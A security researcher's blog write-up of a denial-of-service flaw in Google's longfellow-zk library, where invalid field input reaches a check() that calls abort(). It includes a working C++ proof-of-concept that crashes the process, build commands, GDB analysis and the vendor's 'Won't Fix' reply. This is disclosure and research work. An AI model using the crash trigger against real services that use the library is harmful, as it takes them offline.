---
title: "Finding a DoS in Google's Longfellow-ZK (And Getting Rejected)"
date: 2025-09-08
tags: ["DoS", "MemorySafety", "ZeroKnowledgeProtocol", "ReverseEngineering"]
---


# Finding a DoS in Google's Longfellow-ZK (And Getting Rejected)

## TL;DR

I found a denial of service bug in Google's new crypto library where bad input crashes your whole app. Reported it to Google, they said "won't fix" because it's not severe enough. Here's what happened

## Background

A few months ago I was looking for interesting open source projects to audit. I found [longfellow-zk](https://github.com/google/longfellow-zk) - Google's new library for zero-knowledge proofs. The README mentioned they're doing security reviews, which usually means fresh code with potential bugs.

> "This project is currently undergoing two independent security reviews by panels of academic and industry experts"

You know what that means? Fresh code, security reviews still ongoing, perfect timing to dig in. The library is written in C++ and designed for identity verification stuff like digital IDs and credentials. Perfect target for some security testing.


## Starting Point

I cloned the repo and started looking around:
```bash
git clone https://github.com/google/longfellow-zk.git
cd longfellow-zk
```

The codebase is organized into different modules:
- `algebra/` - math operations for finite fields
- `ec/` - elliptic curve stuff
- `circuits/` - zero-knowledge circuit implementations
- `util/` - helper functions

Being a header-only C++ library, all the code is in `.h` files. I started with the utility functions since that's where error handling usually lives.

## The Bug

I opened `lib/util/panic.h` and found this:

<img width="626" height="656" alt="image" src="https://github.com/user-attachments/assets/ca8a1f8f-c160-40a4-9ad0-869cb35353ae" />



Now, calling `abort()` directly is already a red flag. But where is this being used? So there's a `check()` function that calls `abort()` when something fails. That's already suspicious - `abort()` terminates your entire process with no way to recover.

Then I looked at where this function is used. One example from `lib/algebra/fp_generic.h`:

<img width="714" height="574" alt="image" src="https://github.com/user-attachments/assets/58eb391c-9409-49f5-a27e-3c17b4a04d80" />

```cpp
Elt of_scalar_field(const N& a) const {
    check(a < m_, "of_scalar must be less than m");
    return to_montgomery(a);
}
```

Wait, this function creates field elements for cryptographic operations. If you pass an invalid value (like a number bigger than the field modulus), it calls `check()`, which calls `abort()`, which kills your app.

<img width="512" height="512" alt="c85fcc99-fbf8-4be4-b992-5dfb55183cf3" src="https://github.com/user-attachments/assets/ebcfdc3d-1431-4019-b3ad-97a561e99994" />

That's not error handling  that's a denial of service vulnerability.

---

## Setting Up the Testing Environment

Before diving into the vulnerability, I wanted to build the entire library with memory sanitizers enabled. This helps catch any memory safety issues during testing.

First, I set up a build with AddressSanitizer and UndefinedBehaviorSanitizer:

```bash
$ cd longfellow-zk

# Configure CMake with ASAN and UBSAN
$ CC=/usr/bin/clang CXX=/usr/bin/clang++ cmake -D CMAKE_BUILD_TYPE=Debug \
  -D CMAKE_CXX_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g" \
  -D CMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined" \
  -S lib -B clang-build-asan

# Build the library and tests
$ cd clang-build-asan
$ make -j$(nproc)
```

This builds the entire library with instrumentation that detects:

- Memory corruption (buffer overflows, use-after-free, etc.)
- Undefined behavior (integer overflows, null pointer dereferences, etc.)

The build completed successfully, so I could start testing with the sanitized binaries

## Writing the Proof of Concept

I wanted to write a simple PoC that triggers this bug. The idea is to pass an invalid field value and watch the process crash.

Here's the PoC I wrote (dos_poc.cpp):

```cpp
// PoC for Denial of Service via abort() in Google Longfellow-ZK
// Uses the library's actual implementation without any modifications

#include "lib/algebra/fp_generic.h"
#include "lib/algebra/fp_p256.h"
#include "lib/ec/p256.h"
#include <iostream>

int main() {
    using namespace proofs;
    
    std::cout << "Longfellow-ZK DoS Vulnerability PoC" << std::endl;
    
    // Initialize P256 field using library's actual implementation
    Fp256<true> field;
    
    // Create invalid field value that exceeds P256 modulus
    // P256 modulus = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
    Nat<4> invalid_value;
    invalid_value.limb_[0] = 0xFFFFFFFFFFFFFFFFULL;
    invalid_value.limb_[1] = 0xFFFFFFFFFFFFFFFFULL; 
    invalid_value.limb_[2] = 0xFFFFFFFFFFFFFFFFULL;
    invalid_value.limb_[3] = 0xFFFFFFFFFFFFFFFFULL;
    
    std::cout << "Calling of_scalar_field() with invalid input..." << std::endl;
    std::cout << "Expected: error handling" << std::endl;
    std::cout << "Actual: process termination via abort()" << std::endl;
    
    // This triggers check() -> abort() -> process death
    auto result = field.of_scalar_field(invalid_value);
    
    std::cout << "ERROR: This line should never execute!" << std::endl;
    return 0;
}
```

The PoC is straightforward , I create a P256 field object and try to pass a value that's way larger than the field modulus. All four limbs are set to maximum (0xFFFFFFFFFFFFFFFF), which is definitely invalid

## Testing with Sanitizers

Before running the PoC, I wanted to see if memory sanitizers would catch anything. I compiled with AddressSanitizer and UndefinedBehaviorSanitizer:

```bash
$ clang++ -std=c++17 -fsanitize=address,undefined -fno-omit-frame-pointer -g \
  -I lib/ \
  dos_poc.cpp \
  lib/ec/p256.cc \
  lib/algebra/nat.cc \
  -o dos_poc_asan
```
Running it:

<img width="707" height="289" alt="image" src="https://github.com/user-attachments/assets/53e6cf2a-4859-4046-bc13-7c5bd37080ab" />

Process killed. ASAN didn't report any memory corruption because this isn't a memory bug - it's a design flaw. The code deliberately calls `abort()`, which sanitizers see as intentional program termination

## GDB Analysis

To understand exactly what's happening, I loaded the PoC in GDB. I wanted to see the call stack when the crash occurs

<img width="1051" height="545" alt="image" src="https://github.com/user-attachments/assets/b7002411-2f83-4c1d-94fc-2b12541fd01c" />


Perfect , we hit the breakpoint right when the validation fails. Let me check the arguments:

<img width="1272" height="152" alt="image" src="https://github.com/user-attachments/assets/c3c4c2b8-4cb3-4cc7-8a35-5dd8164756b8" />


The call stack is clear:

1. Our PoC calls `of_scalar_field()` with invalid input (frame #2)
2. Input validation fails at line 261 in `fp_generic.h` (frame #1)
3. The `check()` function gets called with `truth=false` (frame #0)

Now let me step through to see the `abort()` call:

<img width="1083" height="244" alt="image" src="https://github.com/user-attachments/assets/8756a175-9adb-4c6c-ad8c-fab1040bb561" />


And there it is , the process receives SIGABRT and dies. Let me get the full backtrace after the crash:

<img width="1658" height="714" alt="image" src="https://github.com/user-attachments/assets/839f62ef-d7b7-4e9d-a34a-1b795a2fd328" />


Perfect. The evidence is clear:

- Invalid input with all limbs set to max (0xFFFFFFFFFFFFFFFF)
- Validation fails: `truth=false` with message "of_scalar must be less than m"
- Direct call to `abort()` at line 33 in `panic.h`
- Process terminated with SIGABRT (signal 6)

This isn't a memory corruption bug , it's a deliberate design flaw where error handling kills the entire process instead of returning an error that applications can handle.

## Reporting to Google VDP

I had a solid bug with clear evidence:

- Working PoC that crashes the process
- GDB analysis showing the exact call stack
- Clear impact: denial of service

So I wrote up a report and submitted it to Google's Vulnerability Disclosure Program.

## The Response

Google's security team responded pretty quickly. First, I got the automated triage email:

<img width="1449" height="172" alt="image" src="https://github.com/user-attachments/assets/dcd358df-35ca-46d2-9443-f9181559abf0" />


> "We just want to let you know that your report was triaged and we're currently looking into it."

A few days later, the verdict came:

<img width="1437" height="172" alt="image" src="https://github.com/user-attachments/assets/593bcc78-3bb5-4f8e-a435-feabcfa0d59e" />


> **Status: Won't Fix (Infeasible)**
> 
> "We've decided that the issue you reported is not severe enough for us to track it as a security bug. When we file a security vulnerability to product teams, we impose monitoring and escalation processes for teams to follow, and the security risk described in this report does not meet the threshold that we require for this type of escalation on behalf of the security team."

Basically: "Thanks, but no thanks."

## My Thoughts on the Rejection

Look, I get it. Not every technical issue is a security vulnerability from a business perspective. Google has to prioritize what they escalate to engineering teams.

But here's the thing , this is a **design flaw**, not just a minor bug:

1. **The library calls abort()** - This is a process-killing operation with no way to recover
2. **It happens on invalid input** - Something applications need to handle gracefully
3. **It's in a crypto library** - Used for identity verification and ZK proofs

The issue isn't about memory corruption or remote code execution. It's about availability. If your identity verification service uses this library and someone sends malformed data, your entire service crashes.

Is it critical? No. Is it exploitable? Definitely. Should it be fixed? I think so.

## Conclusion

Finding vulnerabilities is only half the battle. Getting them accepted and fixed is another story. This was a valid technical issue , a design flaw that can cause denial of service , but it didn't meet Google's severity threshold for their VDP program.

That's bug bounty hunting. Sometimes you find critical RCE bugs that get you big payouts. Sometimes you find medium-severity issues that get rejected. Both are part of the learning process.

The important takeaway: systematic code review works. I found this by looking at error handling patterns, not by luck. That methodology applies to any codebase.

**Status Update:** As of November 2025 (commit `901c856`, v0.8.5), this vulnerability remains unfixed in the main branch. If you're using longfellow-zk in production, be aware that invalid input can crash your application. Handle your inputs carefully.

---

**Timeline:**
- September 9, 2025: Reported to Google VDP
- September 10, 2025: Triaged  
- September 10, 2025: Closed as "Won't Fix"
- November 16, 2025: Public disclosure (verified still unfixed in v0.8.5)

**Affected versions:** v0.8.3 - v0.8.5 (and likely all versions)

**Commit tested in this writeup:** `902a955fbb22323123aac5b69bdf3442e6ea6f80`

---
*Interested in security research? Check out my other writeups.*
---





